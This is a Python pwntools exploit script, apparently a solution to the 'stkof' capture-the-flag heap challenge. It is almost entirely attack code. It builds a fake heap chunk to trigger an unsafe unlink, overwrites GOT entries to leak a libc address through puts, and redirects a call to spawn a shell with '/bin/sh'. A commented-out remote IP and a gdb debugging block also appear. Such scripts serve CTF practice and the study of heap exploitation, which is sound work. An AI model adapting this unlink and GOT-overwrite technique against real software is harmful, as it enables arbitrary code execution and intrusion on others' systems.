# -*- coding:utf-8 -*-
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'

context.terminal = ['tmux', 'splitw', '-h']
# r = remote('52.68.31.117', 9547)
name = './stkof-patch'
r = process(name)

# libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
binn = ELF(name)

def alloc(size):
    r.sendline("1")
    r.sendline(str(size))
    # return int(r.recvline())

def fill(id, data):
    r.sendline("2")
    r.sendline(str(id))
    r.sendline(str(len(data)))
    r.send(data)

def free(id):
    r.sendline("3")
    r.sendline(str(id))

def dump(id):
    r.sendline("4")
    r.sendline(str(id))


alloc(0x80)
alloc(0x20) # 0xe064b0 2
alloc(0x80) # 0xe064e0 3
alloc(0x80) #  4
alloc(0x80)

# free(3)

target = 0x602158
# fill(2, p64(0)*5 +p64(0x91)+p64(target-0x18)+p64(target-0x10) )
payload = p64(0)+p64(0x81)
payload += p64(target-0x18)+p64(target-0x10)
payload=payload.ljust(0x80,'B')
payload += p64(0x80)+p64(0x90) ## off by one bytes
fill(3, payload)
free(4) # unlink success



payload = ''
payload += p64(0) + p64(binn.got['atol'])+ p64(binn.got['puts'])+ p64(binn.got['free'])

fill(3, payload)
fill(3, p64(binn.plt['puts']))
free(2)

r.recv(37)
libc_base = u64(r.recv(6).ljust(8, '\x00')) -0x6f690
print("libc leak: ", hex(libc_base))

fill(1, p64(libc_base+0x45390))

r.sendline("4")
r.sendline('/bin/sh\0')



print(str(r.proc.pid))

gdb.attach(r, """
heap
echo x/10gx 0xe064b0+0x30 \\n
x/10gx 0xe064b0+0x30

x/10gx  0x0000000000602140
""");
print(str(r.proc.pid))

r.interactive()

